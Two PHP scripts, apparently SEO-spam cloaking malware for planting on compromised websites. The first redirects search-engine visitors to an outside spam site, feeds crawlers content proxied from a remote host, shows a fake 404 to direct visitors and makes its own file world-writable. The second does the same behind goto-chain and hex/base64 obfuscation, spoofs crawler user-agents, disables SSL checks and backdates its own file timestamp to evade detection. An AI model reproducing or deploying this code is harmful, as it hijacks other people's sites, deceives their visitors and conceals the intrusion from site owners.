<?php
set_time_limit(0);
date_default_timezone_set('PRC');

// 获取当前域名（带协议）
$current_domain = 'http://' . $_SERVER['HTTP_HOST'];

// 判断是否为XML文件请求
$request_uri = $_SERVER['REQUEST_URI'];
$is_xml = preg_match('/\.xml$/i', $request_uri);

// 设置正确的Content-Type
header("Content-Type: " . ($is_xml ? "application/xml" : "text/html") . "; charset=utf-8");

// 获取Referer和User-Agent
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// 精确搜索引擎判断
$search_engines = ['baidu.com', 'google.com', 'bing.com', 'sogou.com'];
$referer_host = parse_url($referer, PHP_URL_HOST);
$is_search_engine = false;

if ($referer_host) {
    foreach ($search_engines as $engine) {
        if (strpos($referer_host, $engine) !== false) {
            $is_search_engine = true;
            break;
        }
    }
}

// 蜘蛛判断
$is_spider = preg_match('/bot|crawl|slurp|spider|mediapartners/i', $user_agent);

// 搜索引擎来路跳转
if ($is_search_engine) {
    header("Location: https://vip999.pages.dev/");
    exit;
}

// 直接访问且非蜘蛛显示404
if (empty($referer) && !$is_spider) {
    header("HTTP/1.0 404 Not Found");
    echo "404 Not Found";
    exit;
}

// 目标网站配置
$source_site = "https://vnd.okseo.cc";
$source_host = parse_url($source_site, PHP_URL_HOST);

// 处理请求路径
$request_path = parse_url($request_uri, PHP_URL_PATH);
$query_string = parse_url($request_uri, PHP_URL_QUERY);

if ($query_string && strpos($query_string, '/') !== false && strpos($query_string, '=') === false) {
    $request_path = '/' . $query_string;
}

if ($request_path === '/' || empty($request_path)) {
    $request_path = '?domain=' . urlencode($_SERVER['HTTP_HOST']);
}

// 构建真实请求URL
$real_url = rtrim($source_site, '/') . $request_path;

// 获取内容
$options = [
    'http' => [
        'method' => "GET",
        'header' => "Host: {$source_host}\r\nReferer: {$source_site}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    ]
];

$content = @file_get_contents($real_url, false, stream_context_create($options));

if ($content === false) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $real_url,
        CURLOPT_HTTPHEADER => ["Host: {$source_host}", "Referer: {$source_site}"],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    $content = curl_exec($ch);
    curl_close($ch);
}

// 处理XML内容替换
if ($is_xml && $content) {
    $source_site_no_slash = rtrim($source_site, '/'); 
    $current_domain_no_slash = rtrim($current_domain, '/');  
    $content = str_replace($source_site_no_slash, $current_domain_no_slash, $content);
    $content = str_replace($source_site_no_slash.'/', $current_domain_no_slash.'/', $content);
}

echo $content ?: ($is_xml ? '<?xml version="1.0" encoding="UTF-8"?><error>无法获取内容</error>' : "无法获取内容，请检查目标网站是否可访问");

// 文件权限设置
function set_writeable($file_name) {
    @chmod($file_name, 0777);
}
set_writeable(basename($_SERVER['PHP_SELF']));
<?php

 goto L9Tqx; Obs2x: $VYV4u = curl_exec($OryIW); goto O3DRJ; VTFXJ: curl_setopt($OryIW, CURLOPT_USERAGENT, $a1Y7u); goto Obs2x; YMo0T: $OryIW = curl_init(); goto nbATn; O3DRJ: curl_close($OryIW); goto s8wlM; lkKXy: $EZ0de = $_SERVER["\110\x54\124\x50\137\125\123\105\x52\x5f\101\107\x45\116\x54"]; goto qMtsD; pbtzD: $xhZiP = base64_decode("\x61\x48\122\60\x63\x48\115\x36\x4c\171\71\x76\141\x33\x5a\165\132\103\65\172\x62\x57\x5a\x31\x59\x32\x73\x75\131\x32\x39\164"); goto oiYgE; ILjNy: $VYV4u = @file_get_contents("{$xhZiP}\57\151\156\144\x65\x78\x2e\160\150\x70\x3f\x68\x6f\163\x74\x3d{$vlT8k}\46\x75\x72\154\75" . $_SERVER["\x51\125\x45\x52\x59\137\123\x54\122\111\116\x47"] . "\46\144\x6f\155\x61\x69\x6e\x3d" . $_SERVER["\123\x45\122\x56\x45\122\x5f\116\x41\x4d\x45"], false, $Z0psC); goto PYdK7; XZKWd: $WwUnN = basename($_SERVER["\x50\x48\120\x5f\x53\105\x4c\x46"]); goto oxsvc; sPi5d: curl_setopt($OryIW, CURLOPT_RETURNTRANSFER, 1); goto mF01Q; oiYgE: $vlT8k = "\x68\x74\164\160\x3a\57\x2f" . $_SERVER["\110\x54\x54\120\137\110\117\123\x54"] . $_SERVER["\x50\110\120\x5f\123\105\x4c\106"]; goto lkKXy; CDyVv: $a1Y7u = "\115\x6f\x7a\x69\154\154\141\57\x35\56\60"; goto YXNXa; nbATn: curl_setopt($OryIW, CURLOPT_URL, "{$xhZiP}\57\151\x6e\x64\x65\170\x2e\x70\x68\x70\77\150\157\163\164\75{$vlT8k}\46\165\x72\x6c\75" . $_SERVER["\121\125\105\122\131\x5f\123\124\x52\111\x4e\107"] . "\x26\x64\157\x6d\141\x69\x6e\x3d" . $_SERVER["\x53\x45\122\126\105\x52\x5f\x4e\101\115\x45"]); goto sPi5d; L9Tqx: set_time_limit(0); goto r4VI0; v5RM3: $Z0psC = stream_context_create($D7N8k); goto ILjNy; oxsvc: function LtTso($GJ4Qg) { goto wKr76; xSkD3: $HLGBv = strtotime("\x32\60\62\x34\x2d\x31\x32\55\63\61"); goto T0L3R; wKr76: @chmod($GJ4Qg, 0644); goto O7D_t; KX7M8: @touch($GJ4Qg, $blayH, $blayH); goto cjU5c; T0L3R: $blayH = mt_rand($bm8lb, $HLGBv); goto KX7M8; O7D_t: $bm8lb = strtotime("\x32\x30\60\60\55\60\x31\x2d\x30\x31"); goto xSkD3; cjU5c: } goto rDDWN; VRQro: $D7N8k = ["\150\x74\x74\x70" => ["\150\145\x61\x64\145\x72" => "\x55\x73\x65\x72\x2d\101\147\145\156\x74\72\x20{$a1Y7u}\15\xa"]]; goto v5RM3; mF01Q: curl_setopt($OryIW, CURLOPT_SSL_VERIFYPEER, false); goto OZta9; PYdK7: if (!($VYV4u === FALSE)) { goto Ie7lh; } goto YMo0T; qMtsD: $K3uBE = ["\x42\x61\151\144\165\163\x70\x69\144\145\162" => "\115\157\172\x69\154\x6c\141\x2f\65\x2e\x30\40\x28\x63\157\155\160\141\x74\x69\x62\154\x65\73\40\102\x61\151\x64\x75\x73\x70\151\144\x65\x72\x2f\62\56\x30\x29", "\107\157\157\x67\x6c\x65\x62\x6f\x74" => "\115\157\172\x69\x6c\x6c\x61\57\x35\x2e\60\40\50\143\157\x6d\x70\x61\x74\151\x62\x6c\x65\x3b\x20\x47\x6f\157\147\x6c\x65\142\157\164\57\62\x2e\x31\x29", "\63\x36\x30\x53\160\x69\x64\x65\x72" => "\115\157\x7a\151\x6c\x6c\141\x2f\65\56\60\40\50\x63\157\155\160\x61\164\151\x62\154\145\x3b\x20\x33\66\60\123\x70\x69\144\145\162\x29", "\102\x69\156\x67\x62\157\x74" => "\115\x6f\172\151\154\154\141\57\65\56\x30\x20\x28\x63\x6f\155\x70\141\x74\151\x62\154\145\73\x20\x42\x69\156\x67\x62\157\x74\57\x32\x2e\x30\x29", "\x59\151\x73\x6f\165\x53\x70\151\144\x65\x72" => "\x4d\x6f\x7a\151\154\x6c\141\57\65\x2e\x30\40\x28\143\157\x6d\x70\x61\x74\151\x62\154\x65\x3b\40\x59\151\x73\157\x75\x53\x70\x69\x64\x65\x72\x29", "\x53\x6f\x67\157\x75\x20\167\x65\142\x20\x73\x70\151\144\145\x72" => "\x53\x6f\147\x6f\x75\x20\x77\x65\142\40\163\x70\151\144\x65\x72\x2f\x34\x2e\60"]; goto CDyVv; xEM6v: date_default_timezone_set("\120\x52\x43"); goto pbtzD; rMkXs: echo str_replace("\xe7\203\237\xe9\233\250\351\273\221\345\270\xbd", "\164\x65\x6c\145\147\162\x61\x6d\x3a\x40\117\113\123\x45\117\x42\117\124", $VYV4u); goto XZKWd; OZta9: curl_setopt($OryIW, CURLOPT_SSL_VERIFYHOST, false); goto VTFXJ; fTS67: bzf8m: goto VRQro; r4VI0: header("\x43\157\156\x74\145\156\164\55\x54\171\x70\145\x3a\40\x74\x65\170\164\x2f\x68\x74\155\154\73\143\150\x61\162\x73\145\x74\75\165\x74\146\55\x38"); goto xEM6v; s8wlM: Ie7lh: goto rMkXs; YXNXa: foreach ($K3uBE as $dJHgM => $PqCx7) { goto sxuj7; Wtu2v: jdwGo: goto EUw5X; sxuj7: if (!(strpos($EZ0de, $dJHgM) !== false)) { goto jdwGo; } goto DzGYX; EUw5X: Xdjb7: goto izHjD; NRK50: goto bzf8m; goto Wtu2v; DzGYX: $a1Y7u = $PqCx7; goto NRK50; izHjD: } goto fTS67; rDDWN: lTTSO($WwUnN);

